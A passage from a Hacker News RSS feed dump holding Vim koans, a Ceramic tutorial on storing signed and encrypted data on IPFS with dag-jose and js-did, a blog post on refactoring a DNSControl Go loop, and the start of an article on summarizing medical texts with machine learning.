<p><em>See also: <a href="https://blog.samwhited.com/2015/04/the-dharma-of-vi/">The Dharma of Vi</a>, <a href="https://sanctum.geek.nz/etc/emperor-sh-and-the-traveller.txt">Emperor Sh and the Traveller</a></em></p>

<h2>Master Wq and the Windows developer</h2>

<p>Master Wq was addressing some Vim novices. After his lecture on the many
virtues of Vim, he asked if there were any questions. A young man raised his
hand.</p>

<p>“Master, by what means might one filter for the second column of a plaintext
table for all rows that contain the string ‘tcp’?”</p>

<p>Master Wq said nothing, turned to the whiteboard behind him, and wrote:</p>

<pre><code>:%!awk '/tcp/{print $2}'
</code></pre>

<p>There was a murmur of approval from the other students.</p>

<p>“But I develop on Windows … ” the student stammered.</p>

<p>Master Wq turned again, erased the command, and wrote:</p>

<pre><code>:v/tcp/d
:v/^\s*\S\+\s\+\(\S\+\).*/d
:%s//\1/
</code></pre>

<p>“What! That is far too complex for such a simple task!” cried the student.</p>

<p>Master Wq turned again, erased the command, and wrote:</p>

<pre><code>Microsoft Excel
</code></pre>

<p>At once, the student was enlightened.</p>

<hr>

<h2>No ultimate difference</h2>

<p>One day a monk visited Master Wq, and inquired, “Master, how will my code be
different when I have mastered Vim?”</p>

<p>Master Wq answered, “Before Vim: declare, define, process, print. After Vim:
declare, define, process, print.”</p>

<hr>

<h2>Master Wq and the Markdown acolyte</h2>

<p>A Markdown acolyte came to Master Wq to demonstrate his Vim plugin.</p>

<p>“See, master,” he said, “I have nearly finished the Vim macros that translate
Markdown into HTML. My functions interweave, my parser is a paragon of
efficiency, and the results nearly flawless. I daresay I have mastered
Vimscript, and my work will validate Vim as a modern editor for the enlightened
developer! Have I done rightly?”</p>

<p>Master Wq read the acolyte’s code for several minutes without saying anything.
Then he opened a Markdown document, and typed:</p>

<pre><code>:%!markdown
</code></pre>

<p>HTML filled the buffer instantly. The acolyte began to cry.</p>

<hr>

<h2>Master Wq and the Unix master</h2>

<p>An old Unix master came to Master Wq. “I am troubled, Wq. You teach the way of
Vim. vi is holy but Vim is not; its code sprawls, its features crowd memory;
its binaries are vast, its behavior inconsistent. This is not the way of Unix.
I fear you mislead your students. What can be done?”</p>

<p>Master Wq nodded. “You are right,” he said. “Vim is broken. Let us fix it.
Shall we begin?”</p>

<p>The old Unix master agreed, and opened a shell. He typed:</p>

<pre><code>$ vi vim.c
</code></pre>

<p>He began to code. Master Wq watched for a while and then asked him, “Which
implementation of vi are you using? Nvi? Vim? Elvis?”</p>

<p>“I don’t know,” said the Unix master. “It doesn’t matter.”</p>

<p>Master Wq nodded. The Unix master sat stunned for a moment and closed his
document unsaved.</p>

<hr>

<h2>No greatest tool</h2>

<p>One night there was a storm, and Master Wq’s house collapsed. The next morning
he began to build it again using his old tools. His novice came to help him,
and they built for a while and were making good progress. As they worked, the
novice began to tell Master Wq of his latest accomplishments.</p>

<p>“Master, I have developed a wonderful Vim script to give all sorts of useful
information about a document. It counts the words, the sentences, the
paragraphs, and even tells you what kind of document it is using the syntax
highlighting rules. I use it in my pipelines all the time. It is a thing of
beauty, and I am very proud. Truly, Vim is the greatest tool!”</p>

<p>Master Wq did not reply. Thinking he had unwittingly angered his master, the
novice fell silent and continued his work.</p>

<p>The novice finished aligning two beams and had positioned a nail ready for
beating into the wood, but found the hammer was out of reach.</p>

<p>“Would you pass me the hammer, master?”</p>

<p>Master Wq handed the novice a saw.</p>

<p>At once, the novice was enlightened.</p>

<hr>

<h2>Master Pope’s dream</h2>

<p><a href="https://github.com/tpope">Master Pope</a> once dreamt he was an Emacs user. When he awoke, he exclaimed:</p>

<p>“I do not know if I am Tim Pope dreaming I am an Emacs user, or an Emacs
user dreaming I am Tim Pope!”</p>

<hr>

<h2>The superior editor</h2>

<p><a href="http://vimcasts.org/">Master Neil</a> and <a href="http://derekwyatt.org/">Master Wyatt</a> were famous for their instruction in the
ways of Vim, and travelled around the country teaching.</p>

<p>One day a student asked them, “Master Neil speaks calmly and evenly, his accent
carefully lilting over his words, as though planned down to the syllable. But
Master Wyatt is full of enthusiasm, he starts and stops, his speech is rapid
and energetic, and his soul flows into his lectures. Which is the superior way
of teaching Vim?”</p>

<p>Masters Neil and Wyatt answered in unison, “Which is the superior editor: vi or
ex?”</p>

<p>At once, several students were enlightened.</p>

<hr>

<h2>The slow student’s despair</h2>

<p>Master Wq was eating his luncheon when a student burst into his room and knelt
at his feet. Tears were in his eyes and he seemed profoundly frustrated. Master
Wq put down his bowl and asked, “What upsets you so, young man?”</p>

<p>“Master,” he said. “I give up. I will never attain mastery of Vim! I will never
learn the ways of the great patriarchs! I will never attain the brutal
simplicity, the divine emptiness of perfectly efficient Vim usage!”</p>

<p>“Why do you say this?”</p>

<p>“I am your worst student, by far. When I am struggling with writing a simple
macro, my fellow students are writing recursive macros with ease. When I am
trying to remember the regular expression for white space characters, my fellow
students are writing cyclomatic complexity tests in Vimscript. I am too slow,
and I am ashamed, and I am afraid I have failed.”</p>

<p>Master Wq stood up. “Come with me to the window,” he said.</p>

<p>The student got up and followed Master Wq to the window, and looked across the
street to Master Wq’s neighbour’s house. Through the window, the two could see
a young man in suit and tie, working on a document.</p>

<p>“What do you see?” asked Master Wq. The student watched for a while.</p>

<p>“That young man is using Microsoft Excel to generate a spreadsheet. He is
updating every single cell by hand. He doesn’t even know how to use formulas.
He makes capital letters by pressing Caps Lock, and then pressing it again when
he is done. He is so slow! I do not understand. How can he be so content?”</p>

<p>“Seeing this young man, how can you not be?” returned Master Wq.</p>

<p>The student was immediately enlightened. His name was Qa, and he later became
one of the great masters.</p>

<hr>

<h2>Mastery of Vimscript</h2>

<p>A student enquired of Master Wq, “When will I know I have mastered Vimscript?”</p>

<p>Master Wq answered, “When you never use it.”</p>

<hr>

<h2>The Vim poet</h2>

<p>A young man begged an audience with Master Wq to read him his latest work, an
ode to the glories of Vim. With tearful eyes he read out his heartfelt words,
pouring his soul into his veneration for his text editor.</p>

<p>The master sat and listened to the poet for a while. After the tenth verse, he
held up his hand. “Please, no more. Your poem is awful.”</p>

<p>The young man was very angry.</p>

<p>“Master Wq, surely you of all people can best appreciate the poem, you who know
the great beauty of the editor. How can you be so terse, so dismissive? I even
wrote this poem in Vim!”</p>

<p>“You wrote it in Vim,” said the Master. “But your meter is uneven, your rhyming
pattern inconsistent, your metaphors mixed. You have written a very bad poem
using a very good tool. You are not a poet, and Vim will not make you one; many
of my students are not programmers, and Vim will not help them either.”</p>

<p>“Vim is eternally beautiful,” protested the poet. “It is a worthy subject for
an ode.”</p>

<p>“Vim is not permanent. nvi is not permanent. vi itself is not permanent, only
vi-nature. Emacs has vi-nature, nano has vi-nature, even Notepad has vi-nature.
You narrow your sights, you grow attached, and hence you do not grasp the true
value of your poem’s subject. You must leave. Come back when you have mastered
Emacs.”</p>

<p>The poet left, deeply ashamed. He never returned.</p>

<hr>

<h2>Master Wq’s missing name</h2>

<p><em>Contributed by Rafael Beraldo.</em></p>

<p>One afternoon, Master Wq was meditating under a pine tree. He contemplated how
easily the wind moves through leaves and trunks, both moving them and having
its course altered by their presence. A student approached and nervously stood
by. Having finally mustered all the courage she could, the student said:</p>

<p>“Master Wq, I am troubled by what I have seen.”</p>

<p>The Master looked at her face, and she continued:</p>

<p>“I have mastered movement, I have understood macros, I am familiar with the
source and have not touched vimscript. I have followed your every advice,
ruminated on every teaching. Yet, there is something I cannot understand.
Nowhere in Vim have I found your name. Never has anybody thanked you in the
help pages. How can that be? The greatest of all Vim masters, unknown to all?
In a desperate last try, I ran :Wq and the terminal screamed at me:</p>

<pre><code>E492: Not an editor command: Wq.
</code></pre>

<p>My heart is drowned in doubt, and I am ashamed to admit that.”</p>

<p>Master Wq looked away. After a few moments, he said:</p>

<p>“You think you have committed a great sin. However, the breeze still follows
its path, the leaves make their usual sound and the sky is no greyer.”</p>

<p>As the great master spoke this, with a sharp pebble he wrote in the dirt:</p>

<pre><code>command! Wq wq
</code></pre>
			</div></div>]]>
            </description>
            <link>https://sanctum.geek.nz/arabesque/vim-koans/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149640</guid>
            <pubDate>Thu, 19 Nov 2020 14:15:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Standards for storing signed and encrypted data on IPFS]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25149517">thread link</a>) | @s3n4
<br/>
November 19, 2020 | https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/ | <a href="https://web.archive.org/web/*/https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
                <div>
                    <p>Storing authenticated and encrypted data on <a href="https://ipfs.io/">IPFS</a> is a core building block for many Web3 applications, but to date there has not been a standardized way to encode this type of data.</p><p>Without a standard, many developers have been forced to create custom formats for their signed and encrypted data. This has been prohibitive to the openness and interoperability of information stored in IPFS by siloing data to their particular implementation. Another approach to authenticated data has been to put data in IPFS and put the CID of the data in a smart contract on a blockchain, such as <a href="https://ethereum.org/">Ethereum</a>. This is essentially an expensive way of adding a signature on top of the data and persisting the signature record on the blockchain.</p><p>With the introduction of <strong><a href="https://eips.ethereum.org/EIPS/eip-2844">EIP-2844</a>,</strong> a standard that allows wallets to support a few new methods for signing and decrypting data based on <a href="https://www.w3.org/TR/did-core/">DIDs</a> and the <strong><a href="https://github.com/ipld/specs/pull/269"><code>dag-jose</code></a></strong> IPLD codec, we can now simply put authenticated and encrypted data directly into IPFS. In this tutorial, you will learn how you can utilize these primitives with two libraries, <a href="https://github.com/ceramicnetwork/js-did"><code>js-did</code></a> and <a href="https://github.com/3box/3id-connect"><code>3ID Connect</code></a>!</p><h2 id="what-are-dids-and-jose">What are DIDs and JOSE?</h2><p><strong>DIDs</strong> is the W3C standard for <em>Decentralized Identifiers</em>. It specifies a general way of going from a string identifier, e.g. <code>did:3:bafy...</code>, to a <em>DID document</em> which contains public keys for signature verification and key exchange. In most DID methods the document can be updated when keys are rotated for security reasons.</p><p><strong>JOSE</strong> is a standard from <a href="https://www.ietf.org/standards/">IETF</a> which stands for <em>JSON Object Signing and Encryption,</em> and that pretty much explains what it is. There are two main primitives in this standard: JWS (JSON Web Signatures) and JWE (JSON Web Encryption). Both of these formats allow for multiple participants: in JWS there can be one or multiple signatures over the payload, and in JWE there might be one or multiple recipients for the encrypted cleartext.</p><h2 id="building-with-dag-jose-and-eip2844">Building with dag-jose and EIP2844</h2><p>As we have been building out <a href="https://ceramic.network/">Ceramic</a> with <strong>dag-jose</strong> and <strong>EIP-2844</strong> as basic building blocks, we've created a few lower-level tools which allow us to more easily use these technologies. This tutorial will show you how to use these powerful tools directly.</p><p><strong><a href="https://github.com/3box/identity-wallet-js/">IdentityWallet</a></strong> is an implementation of <strong>EIP-2844</strong> using 3ID as the DID method. It can be used standalone as a <em>DID Provider,</em> or more conveniently within the <strong><a href="https://github.com/3box/3id-connect/">3ID Connect</a></strong> library. 3ID Connect allows users to use their Ethereum wallet (support for more blockchains coming soon) to get access to a <em>DID Provider</em>.</p><p><strong><a href="https://github.com/ceramicnetwork/js-did">js-did</a></strong> is a library that allows developers to represent a user in the form of a DID. This is the main interface we're going to be looking at in this tutorial. It allows us to sign data with the currently authenticated user, encrypt data to any user (DID), and decrypt data with the currently authenticated user.</p><h2 id="signed-data-in-ipfs">Signed data in IPFS</h2><p>By using the <strong>dag-jose</strong> IPLD codec we can create data structures that are linked and signed. This is done by creating JSON Web Signatures (JWS) that contain a link to additional data. One of the main problems that the <strong>dag-jose</strong> codec solves is that the payload of a JWS is traditionally encoded as <code>base64url</code> which means that if it contains any IPLD links you can't traverse those links. Instead what we do with <em>DagJWS</em> is enforce the payload to be the bytes of a CID. The codec then transforms the payload into a CID instance and sets it to the <code>link</code> property of the <em>DagJWS. </em>This allows us to easily traverse the resulting DAG.</p><h2 id="setup-your-environment">Setup your environment</h2><p>This section will cover how to set up some specific dependencies needed for this tutorial. If you just want to skip the setup part we have prepared <a href="https://ceramicstudio.github.io/web-playground/">a simple playground</a> which bundles ipfs, 3id-connect, and dids. You can use it by opening the web page, clicking on connect, then opening the developer console where you can run the commands. If you decide to do so, skip the following two sections.</p><h3 id="setup-ipfs-with-dag-jose-support">Setup IPFS with dag-jose support</h3><p>Since dag-jose is a new IPLD codec it's not yet included in js-ipfs by default. It also implements the new IPLD codec API which is also not supported by js-ipfs yet. Therefore we need to do the following when we are creating an instance of IPFS:</p><pre><code>import IPFS from 'ipfs'
import dagJose from 'dag-jose'
import multiformats from 'multiformats/basics'
import legacy from 'multiformats/legacy'

multiformats.multicodec.add(dagJose)
const dagJoseFormat = legacy(multiformats, dagJose.name)

const ipfs = await Ipfs.create({ ipld: { formats: [dagJoseFormat] } })
</code></pre><h3 id="setup-did-and-3id-connect">Setup DID and 3ID Connect</h3><p>In the example setup below we use an injected Ethereum provider (such as MetaMask) to create a 3ID Connect and DID instance.</p><pre><code>import { DID } from 'dids'
import { ThreeIdConnect, EthereumAuthProvider } from '3id-connect'

// create 3id connect instance
const addresses = await window.ethereum.enable()
const authProvider = new EthereumAuthProvider(window.ethereum, addresses[0])
await threeIdConnect.connect(authProvider)

// create did instance
const didProvider = await threeIdConnect.getDidProvider()
const did = new DID({ provider: didProvider })
await did.authenticate()
window.did = did
console.log('Connected with DID:', did.id)</code></pre><h2 id="create-a-signed-data-structure">Create a signed data structure</h2><p>We can now start signing and adding data to IPFS! First lets create a simple function that takes a payload, signs it using the <code>did.createDagJWS</code> method, and adds the resulting data to IPFS. As we can see in the code below we get two objects back from this method: <code>jws</code> which is the DagJWS itself and <code>linkedBlock</code> which is the raw bytes of the encoded payload. What happens in the background is that the payload gets encoded using <strong>dag-cbor</strong>, after this the CID of the encoded payload is used as the payload of the created <code>jws</code>. We can access this payload CID on the DagJWS instance as <code>jws.link</code>.</p><pre><code>async function addSignedObject(payload) {
  // sign the payload as dag-jose
  const { jws, linkedBlock } = await did.createDagJWS(payload)
  // put the JWS into the ipfs dag
  const jwsCid = await ipfs.dag.put(jws, { format: 'dag-jose', hashAlg: 'sha2-256' })
  // put the payload into the ipfs dag
  await ipfs.block.put(linkedBlock, { cid: jws.link })
  return jwsCid
}</code></pre><p>Using this function, let's create our first signed data objects:</p><pre><code>// Create our first signed object
const cid1 = await addSignedObject({ hello: 'world' })

// Log the DagJWS:
console.log((await ipfs.dag.get(cid1)).value)
// &gt; {
// &gt;   payload: "AXESIHhRlyKdyLsRUpRdpY4jSPfiee7e0GzCynNtDoeYWLUB",
// &gt;   signatures: [{
// &gt;     signature: "h7bHmTaBGza_QlFRI9LBfgB3Nw0m7hLzwMm4nLvcR3n9sHKRoCrY0soWnDbmuG7jfVgx4rYkjJohDuMNgbTpEQ",
// &gt;     protected: "eyJraWQiOiJkaWQ6MzpiYWdjcWNlcmFza3hxeng0N2l2b2tqcW9md295dXliMjN0aWFlcGRyYXpxNXJsem4yaHg3a215YWN6d29hP3ZlcnNpb24taWQ9MCNrV01YTU1xazVXc290UW0iLCJhbGciOiJFUzI1NksifQ"
// &gt;   }],
// &gt;   link: CID(bafyreidykglsfhoixmivffc5uwhcgshx4j465xwqntbmu43nb2dzqwfvae)
// &gt; }

// Log the payload:
ipfs.dag.get(cid1, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }

// Create another signed object that links to the previous one
const cid2 = addSignedObject({ hello: 'getting the hang of this', prev: cid1 })

// Log the new payload:
ipfs.dag.get(cid2, { path: '/link' }).then(b =&gt; console.log(b.value))
// &gt; {
// &gt;   hello: 'getting the hang of this'
// &gt;   prev: CID(bagcqcerappi42sb4uyrjkhhakqvkiaibkl4pfnwpyt53xkmsbkns4y33ljzq)
// &gt; }

// Log the old payload:
ipfs.dag.get(cid2, { path: '/link/prev/link' }).then(b =&gt; console.log(b.value))
// &gt; { hello: 'world' }
</code></pre><p>Note that the values of the CIDs and JWS will be different for you since the payload will be signed by your DID.</p><h2 id="verify-a-signed-data-structure">Verify a signed data structure</h2><p>Verifying a JWS is very straight forward. Simply retrieve the JWS object and pass it to the <code>verifyJWS</code> method. If the signature is invalid, this function will throw an error. If the signature is valid, it will will return the DID (with key fragment) that was used to sign the JWS.</p><pre><code>const jws1 = await ipfs.dag.get(cid1)
const jws2 = await ipfs.dag.get(cid2)

const signingDID1 = await did.verifyJWS(jws1)
await did.verifyJWS(jws2)
</code></pre><h2 id="encrypted-data-in-ipfs">Encrypted data in IPFS</h2><p>Signed data in IPFS is one piece of the puzzle, but perhaps more interesting is encrypted data. With the use of <em>dag-jose</em> and <em>EIP-2844</em> we can encrypt data to one or multiple DIDs and store it directly in IPFS. Below we demonstrate how to use the convenient tools provided by the <em>js-did</em> library to do this.</p><h2 id="encrypt-ipld-data">Encrypt IPLD data</h2><p>There is a simple method to create a DagJWE object which is encrypted to one or multiple DIDs, <code>createDagJWE</code>. This method accepts an IPLD object (a JSON object that may also include CID links) and an array of DIDs. It will resolve the DIDs to retrieve the public encryption keys found in their DID document and create a JWE that is encrypted to these keys. To get going, let's create a helper function that creates a JWE and puts it into IPFS.</p><pre><code>async function addEncryptedObject(cleartext, dids) {
    const jwe = await did.createDagJWE(cleartext, dids)
    return ipfs.dag.put(jwe, { format: 'dag-jose', hashAlg: 'sha2-256' })
}
</code></pre><p>Once we have this function we can create a few encrypted objects. In the example below we first create a simple encrypted object, then we create an additional encrypted object that links to the previous one.</p><pre><code>const cid3 = await addEncryptedObject({ hello: 'secret' }, [did.id])

const cid4 = await addEncryptedObject({ hello: 'cool!', prev: cid3 }, [did.id])</code></pre><p>Note that in the example above we use <code>[did.id](&lt;http://did.id&gt;)</code> to encrypt the data to the currently authenticated DID. We can of course also encrypt the data to the DID of a user that is not locally authenticated, such as another user!</p><h2 id="decrypt-ipld-data">Decrypt IPLD data</h2><p>When the data is retrieved from IPFS we will just get the encrypted JWE. This means that we need to decrypt the data after we fetch it. Since we have created objects that link to each other, lets create a function that retrieves these objects and decrypts them recursively.</p><pre><code>async function followSecretPath(cid) {
    const jwe = (await ipfs.dag.get(cid)).value
    const cleartext = await did.decryptDagJWE(jwe)
    console.log(cleartext)
    …</code></pre></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/">https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/</a></em></p>]]>
            </description>
            <link>https://blog.ceramic.network/how-to-store-signed-and-encrypted-data-on-ipfs/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149517</guid>
            <pubDate>Thu, 19 Nov 2020 14:02:52 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Refactoring a Loop That Was Trying Too Hard]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25149328">thread link</a>) | @YesThatTom2
<br/>
November 19, 2020 | https://www.yesthatblog.com/post/0085-refactoring-a-loop-that-was-trying-too-hard/ | <a href="https://web.archive.org/web/*/https://www.yesthatblog.com/post/0085-refactoring-a-loop-that-was-trying-too-hard/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="main">
      <div>
        <div id="content">
          <article>
    
    

    
    

    
    <div>
      <p>I fixed bug last night.</p>
<p>The bug was difficult to fix because the code was so complex. I wasn’t
really able to fix it until I simplified the code. Once the code was
simplified the bug was easy to fix.  While doing this I
found an anti-pattern that I now call “One loop trying too hard”.</p>

<p>If <code>A</code> never changes, then…</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td>
<td>
<pre><code data-lang="go">    <span>for</span> <span>...</span> <span>{</span>
        <span>if</span> <span>A</span> <span>{</span> <span>B</span> <span>}</span> <span>else</span> <span>{</span> <span>C</span> <span>}</span>
    <span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>…is probably best refactored as…</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span></code></pre></td>
<td>
<pre><code data-lang="go">    <span>if</span> <span>A</span> <span>{</span>
        <span>for</span> <span>...</span> <span>{</span> <span>B</span> <span>}</span>
    <span>else</span>
        <span>for</span> <span>...</span> <span>{</span> <span>C</span> <span>}</span>
    <span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>Why? First of all, you are evaluating <code>A</code> once for each iteration. If
<code>A</code> doesn’t change, that’s a waste of CPU.  But more importantly, this
is really just two loops that just happened to have the same <code>for ...</code>.  Splitting them out makes the code more readable.</p>
<hr>

<p>I was trying to fix a bug in <a href="http://dnscontrol.org/">DNSControl</a>
related to AWS Route53 DNS updates.</p>
<p>The code had been hacked on my many people over the years to add
support for Route53-style aliases and other things.  It was now very
complex and difficult to understand.</p>
<p>The refactoring didn’t just simplify the code to make it easier to
maintain, I was able to fix some other problems along the way.  For
example, the report of what updates are being performed is now sorted,
which makes it easier for the user to notice irregularities.</p>
<h2 id="sidenote-the-joy-of-automated-integration-tests">Sidenote: The joy of automated integration tests</h2>
<p>Reproducing the bug was easy because DNSControl has an embedded
language for describing test cases. Any bug is first reproduced in
this language. We can run the tests frequently while doing development
so that we know when the bug is fixed.</p>
<p>We never delete the old use-cases. This was we get instant feedback if
there are regressions (i.e. the bug creeping back in).</p>
<p>My favorite aspect of this is that I can make aggressive changes with
confidence: if all the use-cases pass, I’m pretty sure I haven’t
broken anything, even some obscured edge-case that was observed years
ago.</p>
<p>I took advantage of this many times while working on this bug. In
fact, there was one point where I wasn’t sure if a change should be
done one way or another. I was sleepy and feeling lazy so I just ran
all the tests both ways. One made nearly ever test fail; the other
worked.  I was too sleepy (and lazy) to investigate why, but it didn’t
matter because… I was sleepy (and lazy).</p>
<p>By the way, these tests are fully automated and accessible to
everyone.  Until a week ago I was the only person that could run the
full suite of tests. However last week my awesome coworker Max
configured Github Actions so that <a href="https://github.com/StackExchange/dnscontrol/actions/runs/359162543">all the tests</a>
run on each PR, no matter who submitted the code.</p>
<p>This makes it easy for others to contribute to the open source project
because it reduces the anxiety over making changes.  Now any
contributor to the project gets the peace of mind that their code
works and doesn’t break other people’s code. Previously contributors
would manually run the test on the DNS provider they use. Now the
automated tests run on the 7 most important providers; and more soon!</p>
<p>As the project maintainer it makes my job easier because I spend less
time testing, more time reviewing the code. This is particularly
important because this is an open source project, not my full-time
job.</p>
<p><strong>Ok, enough about that…  let’s look at the refactoring!</strong></p>
<h2 id="the-refactor-itself">The refactor itself</h2>
<p>While diagnosing the bug, the code looked like this: (pseudocode)</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>Xran</span> <span>=</span> <span>false</span> <span>;</span> <span>Yran</span> <span>=</span> <span>false</span>
<span>for</span> <span>range</span> <span>{</span>
    <span>if</span> <span>invariant</span> <span>{</span>
        <span>X</span> <span>;</span> <span>Xran</span> <span>=</span> <span>true</span>
    <span>}</span> <span>else</span> <span>{</span>
        <span>Y</span> <span>;</span> <span>Yran</span> <span>=</span> <span>true</span>
    <span>}</span>
<span>}</span>
<span>if</span> <span>Xran</span> <span>{</span> <span>Xfollowup</span> <span>}</span>
<span>if</span> <span>Yran</span> <span>{</span> <span>Yfollowup</span> <span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>This was basically a single loop trying to be two different things.
If invariant was true, it was doing task X, which required follow-up
work (Xfollowup).  If the invariant was false, it was doing task Y,
which required different follow-up work.  It was using <code>Xran</code>/<code>Yran</code>
flags to record which variation of the loop was used so that the
proper follow-up code could be executed.</p>
<p>This was refactored into two separate loops by moving the inner <code>if</code>
to be outside, and repeating the loop code for X and again for Y:</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>if</span> <span>invariant</span> <span>{</span>
    <span>for</span> <span>range</span> <span>{</span>
        <span>X</span>
    <span>}</span>
    <span>Xfollowup</span>
<span>}</span> <span>else</span> <span>{</span>
    <span>for</span> <span>range</span> <span>{</span>
        <span>Y</span>
    <span>}</span>
    <span>Yfollowup</span>          <span>&lt;&lt;</span><span>&lt;</span> <span>spoiler</span> <span>alert</span><span>:</span> <span>this</span> <span>is</span> <span>the</span> <span>bug</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>The bug was triggered in some tests but not others. By thinking about
what was different about the failing tests I was able to find the
problem: the Yfollowup task needed to be done for every Y, not just at
the end.</p>
<p>In other words, Yfollowup was to be moved up into the <code>for</code> loop.</p>
<div><div>
<table><tbody><tr><td>
<pre><code><span> 1
</span><span> 2
</span><span> 3
</span><span> 4
</span><span> 5
</span><span> 6
</span><span> 7
</span><span> 8
</span><span> 9
</span><span>10
</span><span>11
</span></code></pre></td>
<td>
<pre><code data-lang="go"><span>if</span> <span>invariant</span> <span>{</span>
    <span>for</span> <span>range</span> <span>{</span>
        <span>X</span>
    <span>}</span>
    <span>Xfollowup</span>
<span>}</span> <span>else</span> <span>{</span>
    <span>for</span> <span>range</span> <span>{</span>
        <span>Y</span>
        <span>Yfollowup</span>      <span>&lt;&lt;</span><span>&lt;</span> <span>moved</span> <span>into</span> <span>the</span> <span>loop</span>
    <span>}</span>
<span>}</span>
</code></pre></td></tr></tbody></table>
</div>
</div><p>After the code was refactored it was easy to fix the bug. Prior to the
refactoring I kept adding more flags and conditionals and… ugh, it
was getting worse and worse.</p>
<p>Once the code was refactored, I could fix the bug much easier.</p>
<h2 id="the-anti-pattern">The anti-pattern</h2>
<p>We should name this the “One loop trying too hard” anti-pattern.</p>
<p>The complexity was due to a loop being used for two entirely different
purposes.  It was nice to not have to repeat the loop iterator, but it
was making everything else more complex.</p>
<p>This is a common anti-pattern: one loop doing two things for no good
reason.  The code smell is that the <em>entire</em> body of the loop was
contained in a big if/then/else. If there was no common code between
the two invariants, why not have two loops?</p>

<p>You can view the refactoring PR in Github.  The loop is on
around line 300 of
<a href="https://github.com/StackExchange/dnscontrol/pull/938/files#diff-248e265c7bf6f13c2713cf28a1df30cdbdd0900849b7ce5eb81071b8bfbded90R292"><code>providers/route53/route53Provider.go</code></a> in
<a href="https://github.com/StackExchange/dnscontrol/pull/938/files">StackExchange/dnscontrol#938</a>.</p>
<p>If you would like to maintain your DNS zone files in a “infrastructure
as code” manner, check out <a href="http://dnscontrol.org/">DNSControl</a>.  It now supports <a href="https://stackexchange.github.io/dnscontrol/provider-list">28 DNS providers</a> such as Route53, Google DNS, and Gandi.  It has some interesting features such as the ability to <a href="https://stackexchange.github.io/dnscontrol/spf-optimizer">optimize your SPF records</a>, and use <a href="https://stackexchange.github.io/dnscontrol/code-tricks">macros to assure consistency</a>.
Writing new providers is so easy that many people have written them as
their <a href="https://everythingsysadmin.com/2017/08/go-get-up-to-speed.html">first experience writing
Go</a>!</p>
<p>FunFact: At Stack Overflow we integrated it into our CI/CD system so that devs
can send PRs to request DNS changes, and SREs don’t have to look at
the PR until it passes all our tests (See? More automated testing!).</p>
<hr>
    </div>

    
    


    
    

    
  </article>

  
  

  
  

  

  
  

  

  

  

    

  

        </div>
      </div>
    </div></div>]]>
            </description>
            <link>https://www.yesthatblog.com/post/0085-refactoring-a-loop-that-was-trying-too-hard/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25149328</guid>
            <pubDate>Thu, 19 Nov 2020 13:44:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to Summarize Medical Texts Using Machine Learning]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25149236">thread link</a>) | @myurushkin
<br/>
November 19, 2020 | https://broutonlab.com/blog/summarization-of-medical-texts-machine-learning | <a href="https://web.archive.org/web/*/https://broutonlab.com/blog/summarization-of-medical-texts-machine-learning">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
				<h2><strong>What is the summarization task?</strong></h2>
<p>Text summarization is the process of selecting the most crucial information from a text to create its shortened version based on a specific goal. Broadly there are two different approaches used to solve this task automatically:</p>
<ol>
<li>Extractive summarization</li>
<li>Abstractive summarization</li>
</ol>
<h2><strong>Extractive summarization</strong></h2>
<p>The name gives away what this approach does: the final summary consists of only sentences and phrases in the original text. The main goal of extractive summarization algorithms is to identify the importance of sentences and phrases.&nbsp; Then it extracts those that have the highest one.</p>
<p>The diagram below illustrates the essence of extractive summarization.</p>
<p><img alt="Summarization of Medical Texts Machine Learning" src="https://broutonlab.com/static/img/blog/summarization-of-medical-texts-machine-learning/summarization-of-medical-texts-machine-learning.jpg"></p>
<p><em>Figure 1. The process of extractive summarization</em></p>
<p>Extractive summaries usually present significant issues and semantic parts of the original text. Due to its simplicity, the approach is suitable for texts of any length.</p>
<h2><strong>Abstractive summarization</strong></h2>
<p>This approach is more complicated because it implies generating a new text in contrast to the extractive summarization. In other words, abstractive summarization algorithms use parts of the original text to get its essential information and create shortened versions of the text. They can contain words and phrases that are not in the original. Such algorithms are usually implemented via deep neural networks.</p>
<p>The process of abstractive summarization looks like how people work with information. The principle is illustrated in the diagram below.</p>
<p><img alt="Abstractive Summarization Using Machine Learning " src="https://broutonlab.com/static/img/blog/summarization-of-medical-texts-machine-learning/abstractive-summarization-using-machine-learning.jpg"></p>
<p><em>Figure 2. The process of abstractive summarization</em></p>
<h2><strong>Comparison of abstractive and extractive approaches</strong></h2>
